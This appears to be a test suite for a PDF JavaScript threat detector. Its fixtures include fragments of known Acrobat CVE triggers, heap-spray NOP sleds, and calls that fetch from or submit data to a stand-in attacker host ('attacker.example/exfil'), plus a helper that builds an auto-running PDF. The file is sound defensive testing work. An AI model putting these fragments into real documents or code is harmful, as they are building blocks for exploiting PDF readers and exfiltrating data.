"""Sprint 8 — PDF Reader DOM threat-pattern detection.

Patterns specific to JS embedded in PDFs: app.*, Collab.*, util.*,
media.*, this.*. Each pattern ties to a real exploit family or
high-signal abuse surface."""

import os
import sys

import pytest

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from Utils.js_analysis import detect_threat_patterns
from structure import Structure
from Utils.password_broker import PasswordBroker


@pytest.fixture(autouse=True)
def _clear():
    Structure.clear_cache()
    PasswordBroker.clear()
    yield
    Structure.clear_cache()
    PasswordBroker.clear()


def _names(findings):
    return {f["pattern"] for f in findings}


# ---------------------------------------------------------------
# CRITICAL — known CVE primitives + heap spray + privilege elevation
# ---------------------------------------------------------------


def test_cve_2008_2992_util_printf_format():
    src = 'util.printf("%4500D", num);'
    f = detect_threat_patterns(src)
    assert "pdf_cve_2008_2992" in _names(f)
    assert any(x["severity"] == "CRITICAL"
               and x["pattern"] == "pdf_cve_2008_2992" for x in f)


def test_cve_2007_5659_collab_collect_email():
    src = "Collab.collectEmailInfo({subj: 'x', msg: 'y'});"
    f = detect_threat_patterns(src)
    assert "pdf_cve_2007_5659" in _names(f)


def test_cve_2009_4324_media_new_player():
    src = "media.newPlayer(null);"
    f = detect_threat_patterns(src)
    assert "pdf_cve_2009_4324" in _names(f)


def test_cve_2009_1492_get_annots_overflow():
    src = "this.getAnnots({nStart: 0, nEnd: -1});"
    f = detect_threat_patterns(src)
    assert "pdf_cve_2009_1492" in _names(f)


def test_cve_2009_0658_custom_dictionary_open():
    src = "this.spell.customDictionaryOpen('/c/x', 'name');"
    f = detect_threat_patterns(src)
    assert "pdf_cve_2009_0658" in _names(f)


def test_heap_spray_unicode_nop_sled():
    src = "var sled = unescape('%u9090%u9090%u9090%u9090%u9090%u9090"\
          "%u9090%u9090%u9090%u9090%u9090%u9090');"
    f = detect_threat_patterns(src)
    assert "pdf_heap_spray" in _names(f)


def test_heap_spray_hex_nop_sled():
    # Contiguous \x90 sequence — typical of real heap-spray strings
    src = "var sled = '" + "\\x90" * 25 + "';"
    f = detect_threat_patterns(src)
    assert "pdf_heap_spray" in _names(f)


def test_app_begin_priv_privilege_elevation():
    src = "app.beginPriv(); doStuff(); app.endPriv();"
    f = detect_threat_patterns(src)
    assert "pdf_privilege_elevation" in _names(f)


# ---------------------------------------------------------------
# HIGH — trust manager bypass + abuse primitives
# ---------------------------------------------------------------


def test_trusted_function_bypass():
    src = "var safeFn = app.trustedFunction(function(){ /* … */ });"
    f = detect_threat_patterns(src)
    assert "pdf_trusted_function" in _names(f)


def test_launch_url():
    src = "app.launchURL('https://attacker.example/payload', true);"
    f = detect_threat_patterns(src)
    assert "pdf_launch_url" in _names(f)


def test_export_data_object():
    src = "this.exportDataObject({cName: 'embedded.exe', nLaunch: 2});"
    f = detect_threat_patterns(src)
    assert "pdf_export_data" in _names(f)


def test_save_as():
    src = "this.saveAs('/c/temp/payload.bin');"
    f = detect_threat_patterns(src)
    assert "pdf_save_as" in _names(f)


def test_exec_menu_item():
    src = "app.execMenuItem('SaveAs');"
    f = detect_threat_patterns(src)
    assert "pdf_exec_menu_item" in _names(f)


def test_submit_form_external_url():
    src = "this.submitForm('https://attacker.example/exfil', true);"
    f = detect_threat_patterns(src)
    assert "pdf_submit_form_url" in _names(f)


# ---------------------------------------------------------------
# MEDIUM — common but notable
# ---------------------------------------------------------------


def test_app_alert_medium():
    src = "app.alert('Click OK to continue');"
    f = detect_threat_patterns(src)
    matches = [x for x in f if x["pattern"] == "pdf_app_alert"]
    assert matches and matches[0]["severity"] == "MEDIUM"


def test_util_printd_medium():
    src = "var d = util.printd('yyyy-mm-dd', new Date());"
    f = detect_threat_patterns(src)
    assert "pdf_util_printd" in _names(f)


# ---------------------------------------------------------------
# Integration — extracted PDF JS picks up these patterns end-to-end
# ---------------------------------------------------------------


def _pdf_with_js(js_source: str) -> bytes:
    js = js_source.encode("utf-8")
    objs = [b""]
    objs.append(b"<< /Type /Catalog /Pages 2 0 R /OpenAction 3 0 R >>")
    objs.append(b"<< /Type /Pages /Kids [] /Count 0 >>")
    objs.append(b"<< /Type /Action /S /JavaScript /JS 4 0 R >>")
    escaped = js.replace(b"\\", b"\\\\").replace(b"(", b"\\(").replace(b")", b"\\)")
    objs.append(b"(" + escaped + b")")
    body = b"%PDF-1.7\n"
    offsets = []
    for i in range(1, len(objs)):
        offsets.append(len(body))
        body += f"{i} 0 obj\n".encode() + objs[i] + b"\nendobj\n"
    xref_pos = len(body)
    body += b"xref\n0 " + str(len(objs)).encode() + b"\n0000000000 65535 f \n"
    for off in offsets:
        body += f"{off:010d} 00000 n \n".encode()
    body += (b"trailer << /Size " + str(len(objs)).encode()
             + b" /Root 1 0 R >>\nstartxref\n"
             + str(xref_pos).encode() + b"\n%%EOF\n")
    return body


def test_pdf_with_collab_collectemailinfo_lights_up_endtoend():
    pytest.importorskip("PyPDF2")
    s = Structure.create(
        data=_pdf_with_js("Collab.collectEmailInfo({});"),
        filename="cve.pdf",
        mime_type="application/pdf",
    )
    js_child = next(c for c in s.get_children()
                    if c.filename and "pdf_js" in c.filename)
    threats = [v for k, v in js_child.analyzer.reports.items()
               if k.startswith("threat")]
    assert threats, list(js_child.analyzer.reports)
    assert any("collab" in t.text.lower()
               or "pdf_cve_2007_5659" in t.label
               for t in threats), [t.text for t in threats]


def test_legit_pdf_js_does_not_fire_pdf_critical_patterns():
    """A legitimate form-validator JS should not light up CRITICAL
    PDF-specific patterns."""
    src = "var f = this.getField('amount'); if (f.value > 1000) f.fillColor = color.red;"
    f = detect_threat_patterns(src)
    critical = [x for x in f if x["severity"] == "CRITICAL"]
    pdf_critical = [x for x in critical if x["pattern"].startswith("pdf_")]
    assert pdf_critical == [], pdf_critical
